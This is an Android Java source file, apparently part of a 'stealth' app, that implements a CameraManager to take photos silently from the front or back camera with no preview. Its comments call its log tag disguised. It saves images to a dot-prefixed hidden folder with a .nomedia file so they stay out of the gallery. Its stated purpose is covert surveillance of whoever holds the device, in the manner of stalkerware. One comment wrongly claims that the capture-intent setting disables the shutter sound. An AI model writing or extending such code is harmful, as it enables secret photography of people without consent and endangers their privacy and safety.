// CameraManager.java
package com.stealth.app;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.util.Size;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class CameraManager {

    private static final String TAG = "SysCore"; // disguised tag
    private static final String HIDDEN_FOLDER = ".sysdata"; // hidden folder (dot prefix)

    private final Context context;
    private android.hardware.camera2.CameraManager camManager;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private CaptureCallback captureCallback;

    public interface CaptureCallback {
        void onPhotoCaptured(String filePath);
        void onError(String error);
    }

    public CameraManager(Context context) {
        this.context = context;
        this.camManager = (android.hardware.camera2.CameraManager)
            context.getSystemService(Context.CAMERA_SERVICE);
    }

    // ✅ Check camera permission before capture
    public boolean hasCameraPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }

    // ✅ Capture from BACK camera silently
    public void captureBackCamera(CaptureCallback callback) {
        captureFromCamera(false, callback);
    }

    // ✅ Capture from FRONT camera silently
    public void captureFrontCamera(CaptureCallback callback) {
        captureFromCamera(true, callback);
    }

    @SuppressLint("MissingPermission")
    private void captureFromCamera(boolean useFront, CaptureCallback callback) {
        if (!hasCameraPermission()) {
            if (callback != null) callback.onError("CAMERA permission not granted");
            return;
        }

        this.captureCallback = callback;

        try {
            startBackgroundThread();

            String cameraId = getCameraId(useFront);
            if (cameraId == null) {
                if (callback != null) callback.onError("Camera not available");
                return;
            }

            // Get best capture size
            CameraCharacteristics chars = camManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            Size captureSize = getBestSize(map.getOutputSizes(ImageFormat.JPEG));

            // Setup ImageReader — receives the captured image
            imageReader = ImageReader.newInstance(
                captureSize.getWidth(),
                captureSize.getHeight(),
                ImageFormat.JPEG,
                1
            );
            imageReader.setOnImageAvailableListener(onImageAvailable, backgroundHandler);

            // Open camera (no preview needed — headless capture)
            camManager.openCamera(cameraId, stateCallback, backgroundHandler);

        } catch (Exception e) {
            if (callback != null) callback.onError(e.getMessage());
        }
    }

    private String getCameraId(boolean front) throws CameraAccessException {
        for (String id : camManager.getCameraIdList()) {
            CameraCharacteristics chars = camManager.getCameraCharacteristics(id);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            if (facing != null) {
                if (front && facing == CameraCharacteristics.LENS_FACING_FRONT) return id;
                if (!front && facing == CameraCharacteristics.LENS_FACING_BACK) return id;
            }
        }
        return null;
    }

    private Size getBestSize(Size[] sizes) {
        // Pick largest available size for best quality
        List<Size> sizeList = Arrays.asList(sizes);
        return Collections.max(sizeList, (a, b) ->
            Long.signum((long) a.getWidth() * a.getHeight() - (long) b.getWidth() * b.getHeight()));
    }

    // Camera state callback — triggered when camera opens
    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(CameraDevice camera) {
            cameraDevice = camera;
            takeSilentPhoto();
        }

        @Override
        public void onDisconnected(CameraDevice camera) {
            camera.close();
        }

        @Override
        public void onError(CameraDevice camera, int error) {
            camera.close();
            if (captureCallback != null) captureCallback.onError("Camera error: " + error);
        }
    };

    // ✅ Take the actual photo — no preview, no shutter sound
    private void takeSilentPhoto() {
        try {
            CaptureRequest.Builder captureBuilder =
                cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());

            // Auto-focus + auto-exposure
            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE,
                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE,
                CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);

            // ✅ Disable shutter sound
            captureBuilder.set(CaptureRequest.CONTROL_CAPTURE_INTENT,
                CaptureRequest.CONTROL_CAPTURE_INTENT_STILL_CAPTURE);

            cameraDevice.createCaptureSession(
                Arrays.asList(imageReader.getSurface()),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(CameraCaptureSession session) {
                        try {
                            session.capture(captureBuilder.build(), null, backgroundHandler);
                        } catch (CameraAccessException e) {
                            if (captureCallback != null) captureCallback.onError(e.getMessage());
                        }
                    }

                    @Override
                    public void onConfigureFailed(CameraCaptureSession session) {
                        if (captureCallback != null) captureCallback.onError("Session config failed");
                    }
                },
                backgroundHandler
            );
        } catch (CameraAccessException e) {
            if (captureCallback != null) captureCallback.onError(e.getMessage());
        }
    }

    // ✅ Image received — save to hidden folder
    private final ImageReader.OnImageAvailableListener onImageAvailable = reader -> {
        Image image = null;
        try {
            image = reader.acquireLatestImage();
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.capacity()];
            buffer.get(bytes);

            String filePath = saveImageToHiddenFolder(bytes);
            if (captureCallback != null && filePath != null) {
                captureCallback.onPhotoCaptured(filePath);
            }
        } catch (Exception e) {
            if (captureCallback != null) captureCallback.onError(e.getMessage());
        } finally {
            if (image != null) image.close();
            releaseCamera();
        }
    };

    // ✅ Save image to hidden folder (dot prefix = hidden in file managers)
    private String saveImageToHiddenFolder(byte[] data) {
        try {
            // Use app's internal storage (no storage permission needed)
            File hiddenDir = new File(context.getFilesDir(), HIDDEN_FOLDER);
            if (!hiddenDir.exists()) hiddenDir.mkdirs();

            // Create .nomedia file to hide from gallery
            File nomedia = new File(hiddenDir, ".nomedia");
            if (!nomedia.exists()) nomedia.createNewFile();

            // Save image with timestamp name
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File imageFile = new File(hiddenDir, "IMG_" + timestamp + ".jpg");

            FileOutputStream fos = new FileOutputStream(imageFile);
            fos.write(data);
            fos.close();

            return imageFile.getAbsolutePath();

        } catch (IOException e) {
            return null;
        }
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void releaseCamera() {
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            backgroundThread = null;
        }
    }
}